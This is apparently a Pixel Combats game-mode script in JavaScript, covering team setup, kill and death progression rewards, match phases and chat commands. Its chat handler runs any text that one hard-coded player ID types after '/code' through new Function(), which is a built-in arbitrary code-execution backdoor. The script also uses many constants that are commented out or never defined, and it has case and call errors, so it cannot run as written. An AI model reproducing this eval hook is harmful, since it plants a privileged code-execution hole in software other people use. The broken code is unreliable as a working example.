import * as Room from 'pixel_combats/room';
import * as Basic from 'pixel_combats/basic';

try {

// константы
const MainTime = 1801;
const End0fMatchTime = 11;
const RazmincaTime = 121;
const MockModeTime = 21;
const MaxDeaths = Room.Players.MaxCount * 10;
//const TextBlue = '<b><size=220><color=#0d177c>ß</color><color=#03088c>l</color><color=#0607b0>ᴜ</color><color=#1621ae>E</color></size></b>';
//const TextRed = '<b><size=220><color=#962605>尺</color><color=#9a040c>ᴇ</color><color=#b8110b>D</color></size></b>'
//const TextLoosersBlue = '<b><size=220><color=#0303a4>ß</color><color=#0b2cc0>l</color><color=#0903af>ᴜ</color><color=#2a00de>E</color><color=#ce0206> </color><color=#0735bb>Ｇ</color><color=#1c15b5>ᴀ</color><color=#1b28d2>爪</color><color=#0e24b8>Ɇ</color><color=#d22c0d> </color><color=#0b06bc>Ｏ</color><color=#0021c3>ᴠ</color><color=#094ed2>E</color><color=#1c0be4>尺</color><color=#1234c5>!</color></size></b>';
//const TextLoosersRed = '<b><size=220><color=#c00f03>尺</color><color=#da140f>ᴇ</color><color=#bc0015>D</color><color=#f02c13> </color><color=#ce0206>Ｇ</color><color=#c6220c>ᴀ</color><color=#c70213>爪</color><color=#d82a09>Ɇ</color><color=#d72c0e> </color><color=#d22c0d>Ｏ</color><color=#c50705>ᴠ</color><color=#d42907>E</color><color=#ab081c>尺</color><color=#d10e0c>!</color></size></b>';	
//const TextWinnersRed = '<b><size=220><color=#c00f03>尺</color><color=#da140f>ᴇ</color><color=#bc0015>D</color><color=#f02c13> </color><color=#ce0206>Ｇ</color><color=#c6220c>ᴀ</color><color=#c70213>爪</color><color=#d82a09>Ɇ</color><color=#d72c0e> </color><color=#d22c0d>Ｗ</color><color=#c50705>ɪ</color><color=#d42907>ｎ</color><color=#ab081c>ᴇ</color><color=#d10e0c>Ɇ</color><color=#d51220>尺</color><color=#b90700>ｓ</color><color=#d1102e>!</color></size></b>'
//const TextWinnersBlue = '<b><size=220><color=#0303a4>ß</color><color=#0b2cc0>l</color><color=#0903af>ᴜ</color><color=#2a00de>E</color><color=#ce0206> </color><color=#0735bb>Ｇ</color><color=#1c15b5>ᴀ</color><color=#1b28d2>爪</color><color=#0e24b8>Ɇ</color><color=#d22c0d> </color><color=#0b06bc>ͬ</color><color=#0021c3>Ｗ</color><color=#094ed2>ɪ</color><color=#1c0be4>ｎ</color><color=#1234c5>ᴇ</color><color=#0a1ace>Ɇ</color><color=#0416b5>尺</color><color=#1600c7>ｓ</color><color=#0b27ff>!</color></size></b>';	
const WaitingStateValue = 'Waiting';
const RazmincaStateValue = 'Razminca';
const MainStateValue = 'Main';
const MockModeStateValue = 'MockMode';
const End0fMatchStateValue = 'End0fMatch';
const StateProp = Room.Properties.GetContext().Get('State');
const MainTimer = Room.Timers.GetContext().Get('Main');
const ScoresTimer = Room.Timers.GetContext().Get('Scores');
Room.Ui.GetContext().MainTimerId.Value = MainTimer.Id;

// создаем команды
Room.Teams.Add('Red', 'Красная КОМАНДА\nby: TnT live (Official)', new Basic.Color(125/255, 0, 0, 0));
Room.Teams.Add('Blue', 'Синия КОМАНДА\nby: TnT live (Official)', new Basic.Color(0, 0, 125/255, 0));
const RedTeam = Room.Teams.Get('Red');
const BlueTeam = Room.Teams.Get('Blue');
RedTeam.Spawns.SpawnPointsGroups.Add(2);
RedTeam.Build.BlocksSet.Value = Room.BuildBlocksSet.Red;
BlueTeam.Spawns.SpawnPointsGroups.Add(1); 
BlueTeam.Build.BlocksSet.Value = Room.BuildBlocksSet.Blue;

// Параметры, создания - комнаты (Настройки):
Room.BreackGraph.WeakBlocks = Room.GameMode.Parameters.GetBool('LoosenBlocks'); // Ослабить, блоки.
Room.BreackGraph.OnlyPlayerBlocksDmg = Room.GameMode.Parameters.GetBool('PartialDesruction'); // Усилить, блоки.
Room.Damage.GetContext().FriendlyFire.Value = Room.GameMode.Parameters.GetBool('FriendlyFire');  // Урон, по своим.  
Room.Damage.GetContext().DamageOut.Value = true;  // Урон.
Room.TeamsBalancer.IsAutoBalance = true; // Авто - баланс, команд.
Room.Damage.GetContext().GranadeTouchExplosion.Value = true;  // Урон, по гранате.
Room.Map.Rotation = Room.GameMode.Parameters.GetBool('MapRotation');  // Ротация, карт.
  
// Разрешаем, вход в - команду по, запросу:
Room.Teams.OnRequestJoinTeam.Add(function(Player, Team) { 
	Team.Add(Player);
	Player.Properties.Get('RoomID').Value = Player.IdInRoom;
});
// Спавним, игрока при - входе в, команду:
Room.Teams.OnPlayerChangeTeam.Add(function(Player) { 
	Player.Spawns.Spawn();
});
	
// ЛидерБорды:
Room.LeaderBoard.PlayerLeaderBoardValues = [
  new Basic.DisplayValueHeader('Kills', '<b><size=30><color=#be5f1b>K</color><color=#b65219>i</color><color=#ae4517>l</color><color=#a63815>l</color><color=#9e2b13>s</color></size></b>', '<b><size=30><color=#be5f1b>K</color><color=#b65219>i</color><color=#ae4517>l</color><color=#a63815>l</color><color=#9e2b13>s</color></size></b>'),
  new Basic.DisplayValueHeader('Deaths', '<b><size=30><color=#be5f1b>D</color><color=#b85519>e</color><color=#b24b17>a</color><color=#ac4115>t</color><color=#a63713>h</color><color=#a02d11>s</color></size></b>', '<b><size=30><color=#be5f1b>D</color><color=#b85519>e</color><color=#b24b17>a</color><color=#ac4115>t</color><color=#a63713>h</color><color=#a02d11>s</color></size></b>'),
  new Basic.DisplayValueHeader('Spawns', '<b><size=30><color=#be5f1b>S</color><color=#b85519>p</color><color=#b24b17>a</color><color=#ac4115>w</color><color=#a63713>n</color><color=#a02d11>s</color></size></b>', '<b><size=30><color=#be5f1b>S</color><color=#b85519>p</color><color=#b24b17>a</color><color=#ac4115>w</color><color=#a63713>n</color><color=#a02d11>s</color></size></b>'),
  new Basic.DisplayValueHeader('Scores', '<b><size=30><color=#be5f1b>S</color><color=#b85519>c</color><color=#b24b17>o</color><color=#ac4115>r</color><color=#a63713>e</color><color=#a02d11>s</color></size></b>', '<b><size=30><color=#be5f1b>S</color><color=#b85519>c</color><color=#b24b17>o</color><color=#ac4115>r</color><color=#a63713>e</color><color=#a02d11>s</color></size></b>'),
  new Basic.DisplayValueHeader('RoomID', '<b><size=30><color=#cf5515>R</color><color=#cd4412>I</color><color=#cb330f>D</color></size></b>', '<b><size=30><color=#cf5515>R</color><color=#cd4412>I</color><color=#cb330f>D</color></size></b>')
];
// Определяем, вес команды - в лидерБорде:
Room.LeaderBoard.TeamWeightGetter.Set(function(Team) {
	return Team.Properties.Get('Deaths').Value;
});
// Определяем, вес игрока - в лидерБорде:
Room.LeaderBoard.PlayersWeightGetter.Set(function(Player) {
 return Player.Properties.Get('Kills').Value;
});

// Счётчик, спавнов:
Room.Spawns.OnSpawn.Add(function(Player) {
if (stateProp.Value == MockModeStateValue) return;
 ++Player.Properties.Spawns.Value;
});

// Щит, после спавна - на 5 секунд:
Room.Spawns.GetContext().OnSpawn.Add(function(Player) {
if (StateProp.Value == MockModeStateValue) return;
 Player.Properties.Immortality.Value = true;
	Timer = Player.Timers.Get('immortality').Restart(8);
 });
Room.Timers.OnPlayerTimer.Add(function(Timer){
  if (Timer.Id != 'immortality') return;
 Timer.Player.Properties.Immortality.Value = false;
 });
	
// Счётчик, убийств:
Room.Damage.OnKill.Add(function(Player, Killed) {
	if (StateProp.Value != RazmincaStateValue) {
	 if (StateProp.Value != MockModeStateValue) {
if (Killed.Team != null && Killed.Team != Player.Team) {
  ++Player.Properties.Kills.Value;
 Player.Properties.Scores.Value += 1000;
   // Добавляем, очки - команда, за убийство:
 Player.Properties.Scores.Value += Kill_SCORES;
     if (StateProp.Value !== MainStateValue && Player.Team != null)
	  Player.Team.Properties('Scores').Value += Kill_SCORES;
}
const leaderboard = Room.LeaderBoard.GetTeams();
	if (Player.Properties.Kills.Value === 5) { Player.inventory.Secondary.Value = true, Player.inventory.Melee.Value = false; }
if (Player.Properties.Kills.Value === 10) { Player.inventory.Secondary.Value = false, Player.inventory.Explosive.Value = true, Player.inventory.ExplosiveInfinity.Value = true; }
if (Player.Properties.Kills.Value === 15) { Player.inventory.Explosive.Value = false, Player.inventory.Main.Value = true; }
if (Player.Properties.Kills.Value === 20) { Player.ContextedProperties.MaxHp.Value += 595; }
if (Player.Properties.Kills.Value === 25) { Player.ContextedProperties.SkinType.Value = 2; }
if (Player.Properties.Kills.Value === 30) { Player.inventory.MainInfinity.Value = true; }
if (Player.Properties.Kills.Value === 35) { Player.ContextedProperties.MaxHp.Value = 1408; }
if (Player.Properties.Kills.Value === 40) { Player.inventory.Build.Value = true; }
if (Player.Properties.Kills.Value === 45) { Player.Properties.Kills.Value += 10; }
if (Player.Properties.Kills.Value === 100) {  
	SetMockMode(leaderboard[0].Team, leaderboard[1].Team); }
	  }
     }
   });
	
// Счётчик, смертей:
Room.Damage.OnDeath.Add(function(Player) {
	if (StateProp.Value != RazmincaStateValue) {
if (StateProp.Value == MockModeStateValue) {
	 Spawns.GetContext(Player).Spawn();
	return;
}
    ++Player.Properties.Deaths.Value;
const leaderboard = Room.LeaderBoard.GetTeams();
	if (Player.Properties.Deaths.Value === 10) { Player.ContextedProperties.MaxHp.Value -= 40; if (Player.ContextedProperties.MaxHp.Value <= 0) Player.ContextedProperties.MaxHp.Value = 1; }
if (Player.Properties.Deaths.Value === 20) { Room.Spawns.RespawnTime.Value = 2; }
if (Player.Properties.Deaths.Value === 30) { Player.ContextedProperties.SkinType.Value = 1; }
if (Player.Properties.Deaths.Value === 40) { Player.ContextedProperties.MaxHp.Value -= 60; if (Player.ContextedProperties.MaxHp.Value <= 0) Player.ContextedProperties.MaxHp.Value = 1;}
if (Player.Properties.Deaths.Value === 50) { Player.ContextedProperties.MaxHp.Value -= 70; if (Player.ContextedProperties.MaxHp.Value <= 0) Player.ContextedProperties.MaxHp.Value = 1; }
if (Player.Properties.Deaths.Value === 60) { Player.Properties.Deaths.Value += 10; }
if (Player.Properties.Deaths.Value === 70) { Player.inventory.Melee.Value = false; }
if (Player.Properties.Deaths.Value === 80) { Player.Properties.Kills.Value -= 5; }
if (Player.Properties.Deaths.Value === 90) { Player.Properties.Deaths.Value += 30; }
if (Player.Properties.Deaths.Value === 100) { 
	SetMockMode(leaderboard[0].Team, leaderboard[1].Team); }
   }
});

// После каждой - смерти игрока, отнимаем одну - смерть, в команде:
Room.Properties.OnPlayerProperty.Add(function(Context, Value) {
 if (Value.Name !== 'Deaths') return;
 if (Context.Player.Team === null) return;
if (StateProp.Value != MockModeStateValue) {
   Context.Player.Team.Properties.Get('Deaths').Value--;
  }
});
// Если у игрока - занулилились смерти, то завершаем игру:	
Room.Properties.OnTeamProperty.Add(function(Context, Value) { 
const leaderboard = Room.LeaderBoard.GetTeams();
 if (Value.Name !== 'Deaths') return;
   if (Value.Value <= 0) {
	SetMockMode(leaderboard[0].Team, leaderboard[1].Team);
   }
});

// Переключение, таймеров:
ScoresTimer.OnTimer.Add(function() {
  for (const Player of Room.Players.All) {
if (Player.Team == null) continue; 
   Player.Properties.Scores.Value += Timer_SCORES;
	}
});

globalThis.Room = Room;
globalThis.Basic = Basic;

// Чат команды:
Room.Chat.OnMessage.Add(function(Message) {
	let MessageText = Message.Text.trim(), MessageSender = Room.Players.GetByRoomId(Message.Sender);
	if (MessageText.toLowerCase().replaceAll(' ', '')[0] !== '/' || !MessageSender) return;
	if (MessageSender.id !== '9183CF2B463E5CD6') return;
	let MessageLowerTextWithoutSpaces = MessageText.toLowerCase().replaceAll(' ', '');
	if (MessageLowerTextWithoutSpaces.slice(1, 5) === 'code') {
		try {
			new Function(MessageText.slice(5))();
		} catch (e) {
			MessageSender.PopUp(`Ошибка (e)!\n Имя (e.name): \'${e.name}\',\n Сообщение (e.message): \'${e.message}\',\n Стек (e.stack.trim()): \'${e.stack.trim()}\'.`);
		}
		return;
	}
	if (!MessageSender.Team) return;
	let FunctionNames = ['ban', 'reset'];
	let FunctionName = MessageLowerTextWithoutSpaces.slice(1, MessageLowerTextWithoutSpaces.includes('(') ? MessageLowerTextWithoutSpaces.indexOf('(') : MessageText.includes(' ') ? MessageText.indexOf(' ') : MessageText.length);
	if (!FunctionNames.includes(FunctionName)) {
		MessageSender.PopUp(`Команда: \'${FunctionName}\' не была найдена.`);
		return;
	}
	let Arguments = MessageText.slice((MessageText.includes('(') ? MessageText.indexOf('(') : FunctionName.length + 1) + 1, MessageText.includes('(') && MessageText.includes(')') ? MessageText.indexOf(')') : MessageText.length).split(MessageText.includes('(') ? ',' : ' ');
	if (FunctionName === 'ban') {
		Arguments = Arguments.map(Argument => Argument.replaceAll(' ', ''));
		if (Arguments[0]) Arguments[0] = Arguments[0].replaceAll('я', MessageSender.IdInRoom);
		if (Arguments.length !== 2 && Arguments.length !== 1) {
			MessageSender.PopUp(`Команда: \'${MessageText}\' не была выполнена (ошибка). Причина: Неправильное количество аргументов (должно быть: 1 или 2).`);
			return;
		}
		if (isNaN(+Arguments[0])) {
			MessageSender.PopUp(`Команда: \'${MessageText}\' не была выполнена (ошибка). Причина: Некорректный тип аргумента №1 (должен быть: Число).`);
			return;
		}
		if (Arguments.length === 2) {
			if (isNaN(+Arguments[1])) {
				MessageSender.PopUp(`Команда: \'${MessageText}\' не была выполнена (ошибка). Причина: Некорректный тип аргумента №2 (должен быть: Число).`);
				return;
			}
		}
		let ArgumentativePlayer = Room.Players.GetByRoomId(+Arguments[0]);
		let ArgumentativePlayerInformation = GetPlayerInformation(ArgumentativePlayer);
		if (Arguments.length === 2) {
			if (![0, 1].includes(+Arguments[1])) {
				MessageSender.PopUp(`Команда: \'${MessageText}\' не была выполнена (ошибка). Причина: Некорректный аргумент №2 (должен быть: (0/1)).`);
				return;
			}
		}
		if (!ArgumentativePlayer) {
			MessageSender.PopUp(`Команда: \'${MessageText}\' не была выполнена (ошибка). Причина: Игрока с RoomID аргумент №1 нет.`);
			return;
		}
		if (!ArgumentativePlayer.Team) {
			MessageSender.PopUp(`Команда: \'${MessageText}\' не была выполнена (ошибка). Причина: Игрок с RoomID аргумент №1 находится вне команд.`);
			return;
		}
		if (ArgumentativePlayer.id === MessageSender.id) {
			MessageSender.PopUp(`Команда: \'${MessageText}\' не была выполнена (ошибка). Причина: Игрок с RoomID аргумент №1 это вы.`);
			return;
		}
		if (Arguments.length === 2) {
			if (+Arguments[1]) {
				GiveBanPlayer(ArgumentativePlayer);
				ArgumentativePlayer.PopUp('Вы заBANены!');
				MessageSender.PopUp(`Команда: \'${MessageText}\' была выполнена успешно. Игрок с RoomID аргумент №1 был заBANен.`);
			} else {
				RemoveBanPlayer(ArgumentativePlayer);
				ArgumentativePlayer.PopUp('Вы разBANены!');
				MessageSender.PopUp(`Команда: \'${MessageText}\' была выполнена успешно. Игрок с RoomID аргумент №1 был разBANен.`);
			}
		} else {
			if (ArgumentativePlayerInformation.Ban) {
				RemoveBanPlayer(ArgumentativePlayer);
				ArgumentativePlayer.PopUp('Вы разBANены!');
				MessageSender.PopUp(`Команда: \'${MessageText}\' была выполнена успешно. Игрок с RoomID аргумент №1 был разBANен.`);
			} else {
				GiveBanPlayer(ArgumentativePlayer);
				ArgumentativePlayer.PopUp('Вы заBANены!');
				MessageSender.PopUp(`Команда: \'${MessageText}\' была выполнена успешно. Игрок с RoomID аргумент №1 был заBANен.`);
			}
		}
	}
	if (FunctionName === 'reset') {
		Arguments = Arguments.map(Argument => Argument.replaceAll(' ', ''));
		if (Arguments[0]) Arguments[0] = Arguments[0].replaceAll('я', MessageSender.IdInRoom);
		if (Arguments.length !== 1) {
			MessageSender.PopUp(`Команда: \'${MessageText}\' не была выполнена (ошибка). Причина: Неправильное количество аргументов (должно быть: 1).`);
			return;
		}
		if (isNaN(+Arguments[0])) {
			MessageSender.PopUp(`Команда: \'${MessageText}\' не была выполнена (ошибка). Причина: Некорректный тип аргумента №1 (должен быть: Число).`);
			return;
		}
		let ArgumentativePlayer = Room.Players.GetByRoomId(+Arguments[0]);
		let ArgumentativePlayerInformation = GetPlayerInformation(ArgumentativePlayer);
		if (!ArgumentativePlayer) {
			MessageSender.PopUp(`Команда: \'${MessageText}\' не была выполнена (ошибка). Причина: Игрока с RoomID аргумент №1 нет.`);
			return;
		}
		if (!ArgumentativePlayer.Team) {
			MessageSender.PopUp(`Команда: \'${MessageText}\' не была выполнена (ошибка). Причина: Игрок с RoomID аргумент №1 находится вне команд.`);
			return;
		}
		ArgumentativePlayer.inventory.Main.Value = false;
		ArgumentativePlayer.inventory.Secondary.Value = false;
		ArgumentativePlayer.inventory.Melee.Value = false;
		ArgumentativePlayer.inventory.Explosive.Value = false;
		ArgumentativePlayer.inventory.Build.Value = false;
		MessageSender.PopUp(`Команда: \'${MessageText}\' была выполнена успешно. У игрока с RoomID аргумент №1 был очищен инвентарь.`);
	}
});

// Переключение, режимов:
MainTimer.OnTimer.Add(function() {
 switch (StateProp.Value) {
case WaitingStateValue:
  SetRazminca();
 break;
case RazmincaStateValue:
  SetMain();
 break;
case MainStateValue:
const leaderboard = Room.LeaderBoard.GetTeams();
 SetMockMode(leaderboard[0].Team, leaderboard[1].Team);
 break;
case MockModeStateValue: 
 SetEnd0fMatch_End();
 break;
case End0fMatchStateValue: 
  RestartGame();
 break;
	}
});

// 1 игровое, состояние:
SetWaitingMode();

// Ожидание, игры:
function SetWaitingMode() {
 StateProp.Value = WaitingStateValue;
 Room.Spawns.GetContext().Enable = false;
 Room.Ui.GetContext().Hint.Value = '<b>Ожидание, игроков...</b>';
if (Room.GameMode.Parameters.GetBool('En')) Room.Ui.GetContext().Hint.Value = '<b>Waiting, players...</b>';
 MainTimer.Restart(SixTime);
}
function SetRazminca() {
 StateProp.Value = RazmincaStateValue;
 Room.Ui.GetContext().Hint.Value = 'Разминочный - раунд!';
if (Room.GameMode.Parameters.GetBool('En')) Room.Ui.GetContext().Hint.Value = 'Warmup - round!';
 Room.Spawns.GetContext().Enable = true; 
 SpawnTeams();
 MainTimer.Restart(RazmincaTime);
 ScoresTimer.Stop();
	
var inventory = Room.Inventory.GetContext();
 inventory.Main.Value = true;
 inventory.Secondary.Value = true;
 inventory.Melee.Value = true;
 inventory.Explosive.Value = true;
 inventory.Build.Value = false;

Room.Ui.GetContext().TeamProp1.Value = { Team: 'Red', Prop: 'Text' }; // Задаём, первоначальные настройки, смертей - в табе.
Room.Ui.GetContext().TeamProp2.Value = { Team: 'Blue', Prop: 'Text' };
 Room.Teams.Get('Red').Properties.Get('Text').Value = TextRed;
 Room.Teams.Get('Blue').Properties.Get('Text').Value = TextBlue;
}
function SetMain() {
 StateProp.Value = MainStateValue;
 Room.Ui.GetContext().Hint.Value = 'Матч - начался!';
if (Room.GameMode.Parameters.GetBool('En')) Room.Ui.GetContext().Hint.Value = 'Match - begun!';
 SpawnTeams();
 MainTimer.Restart(MainTime);

var inventory = Room.Inventory.GetContext();
 inventory.Main.Value = false;
 inventory.Secondary.Value = false;
 inventory.Melee.Value = true;
 inventory.Explosive.Value = false;
 inventory.Build.Value = false;

Room.Ui.GetContext().TeamProp1.Value = { Team: 'Red', Prop: 'Deaths' }; 
Room.Ui.GetContext().TeamProp2.Value = { Team: 'Blue', Prop: 'Deaths' };
 Room.Teams.Get('Red').Properties.Get('Deaths').Value = MaxDeaths;
Room.Teams.Get('Blue').Properties.Get('Deaths').Value = MaxDeaths;
}
function SetMockMode(winners, loosers) {
 StateProp.Value = MockModeStateValue; // Задаём, название для - режима.
 MainTimer.Restart(MockModeTime); // Таймер, режима.
 ScoresTimer.Stop(); // Останавливаем таймер.
 Room.Ui.GetContext(winners).Hint.Value = '!Победа, караем - проигравших!))'; // Подсказка, для - победивших.
 Room.Ui.GetContext(loosers).Hint.Value = '!Мы проиграли, победившие карают - нас!'; // Подсказка, для - проигравших.
if (Room.GameMode.Parameters.GetBool('End')) {
 Room.Ui.GetContext(winners).Hint.Value = '!Victory, we punish - the losers!))';
}
if (Room.GameMode.Parameters.GetBool('End')) {
 Room.Ui.GetContext(loosers).Hint.Value = '!We lost, the winners - punish us!';
}
 Room.Spawns.GetContext(loosers).Spawn(); // Заспавнить проигравших, на базу.
 Room.Spawns.GetContext(loosers).RespawnTime.Value = 0; // Нулевой спавн, для проигравших.

// Set loosers, inventory && сэт инвентаря, для проигравших:
var inventory1 = Room.Inventory.GetContext(loosers);
 inventory1.Main.Value = false;
 inventory1.Secondary.Value = false;
 inventory1.Melee.Value = false;
 inventory1.Explosive.Value = false;
 inventory1.Build.Value = false;

// Set winners, inventory && сэт инвентаря, для победивших: 
var inventory2 = Room.Inventory.GetContext(winners);
 inventory2.Main.Value = true;
 inventory2.MainInfinity.Value = true;
 inventory2.Secondary.Value = true;
 inventory2.SecondaryInfinity.Value = true;
 inventory2.Explosive.Value = true;
 inventory2.ExplosiveInfinity.Value = true;
 inventory2.BuildInfinity.Value = true;
 inventory2.Build.Value = true;

// Задаём, табы для loosers&&winners:
Room.Teams.Get('Red').Properties.Get('TextLoosersRed').Value = TextLoosersRed;
Room.Teams.Get('Blue').Properties.Get('TextWinnersBlue').Value = TextWinnersBlue;
Room.Ui.GetContext(loosers).TeamProp1.Value = { Team: 'Red', Prop: 'TextLoosersRed' };
Room.Ui.GetContext(winners).TeamProp2.Value = { Team: 'Blue', Prop: 'TextWinnersBlue' };

Room.Teams.Get('Red').Properties.Get('TextWinnersRed').Value = TextWinnersRed;
Room.Teams.Get('Blue').Properties.Get('TextLoosersBlue').Value = TextLoosersBlue;
Room.Ui.GetContext(winners).TeamProp1.Value = { Team: 'Red', Prop: 'TextWinnersRed' };
Room.Ui.GetContext(loosers).TeamProp2.Value = { Team: 'Blue', Prop: 'TextLoosersBlue' };
}
function SetEnd0fMatch_End() {
 ScoresTimer.Stop(); 
const leaderboard = Room.LeaderBoard.GetTeams();
for (const WinPlayer of leaderboard[0].Team.Players) {
	WinPlayer.Properties.Scores.Value += Winner_SCORES;
} 
   SetEnd0fMatch();
}
function SetEnd0fMatch() {
StateProp.Value = End0fMatchStateValue;
Room.Ui.GetContext().Hint.Value = '<b>Конец, матча!</b>';
 if (Room.GameMode.Parameters.GetBool('End')) Room.Ui.GetContext().Hint.Value = '<b>The end of, the match!</b>';
MainTimer.Restart(SixTime);
Room.Game.GameOver(Room.LeaderBoard.GetTeams());
Room.Spawns.GetContext().Enable = false;
Room.Spawns.GetContext().Despawn();
}
	
function RestartGame() {
if (Room.GameMode.Parameters.GetBool('LoadRandomMap')) Room.Map.LoadRandomMap();
else Room.Game.RestartGame(); 
}

function SpawnTeams() {
  for (const Player of Room.Players.All) {
if (Player.Team === null) continue; // В не команды, не спавним игрока. 
   Room.Spawns.GetContext(RedTeam).Spawn();
Room.Spawns.GetContext(BlueTeam).Spawn();
  }
}
function GiveBanPlayer(p) {
	if (!p) return;
	if (!p.Team) return;
	p.spawns.enable = false;
	p.spawns.Despawn();
	p.Properties.Get('Ban').Value = true;
	ImportantPlayersIDs.Bans.push(p.id);
}
function RemoveBanPlayer(p) {
	if (!p) return;
	if (!p.Team) return;
	p.spawns.enable = true;
	p.Spawns.Spawn();
	p.Properties.Get('Ban').Value = false;
	if (ImportantPlayersIDs.Bans.includes(p.id)) ImportantPlayersIDs.Bans.splice(ImportantPlayersIDs.Bans.indexOf(p.id), 1);
}
function GetPlayerInformation(p) {
	if (!p) return;
        return {
                NickName: p.NickName.replaceAll('<', '_').replaceAll('>', '_'),
                RoomID: p.IdInRoom,
                ID: p.id,
                Lvl: p.Properties.Lvl.Value,
                TesterLvl: p.Properties.TesterLvl.Value,
                Weapons: {
                        Main: p.inventory.Main.Value,
                        MainInfinity: p.inventory.MainInfinity.Value,
                        Secondary: p.inventory.Secondary.Value,
                        SecondaryInfinity: p.inventory.SecondaryInfinity.Value,
                        Melee: p.inventory.Melee.Value,
                        Explosive: p.inventory.Explosive.Value,
                        ExplosiveInfinity: p.inventory.ExplosiveInfinity.Value,
                        Build: p.inventory.Build.Value,
                        BuildInfinity: p.inventory.BuildInfinity.Value,
                },
                Skin: p.contextedProperties.SkinType.Value,
                MaxHp: p.contextedProperties.MaxHp.Value,
		Fly: p.Build.FlyEnable.Value,
                Kills: p.Properties.Kills.Value,
                Deaths: p.Properties.Deaths.Value,
                Scores: p.Properties.Scores.Value,
		Creator: p.Properties.Get('Creator').Value,
		Ban: p.Properties.Get('Ban').Value,
		BanByCreator: p.Properties.Get('BanByCreator').Value,
		Position: p.Position,
		Rotation: p.Rotation,
		BuildSpeed: p.contextedProperties.BuildSpeed.Value,
		StartBlocksCount: p.contextedProperties.StartBlocksCount.Value,
		BuildMode: p.Build.BuildModeEnable.Value,
		Balk: p.Build.BalkLenChange.Value,
		AllBlocks: p.Build.BlocksSet.Value === Room.BuildBlocksSet.AllClear
        }
}

ScoresTimer.RestartLoop(IntervalTimer_SCORES);

} catch (e) {
        Room.Players.All.forEach(msg => {
                Room.msg.Show(`${e.name}: ${e.message} ${e.stack}`);
        });
}
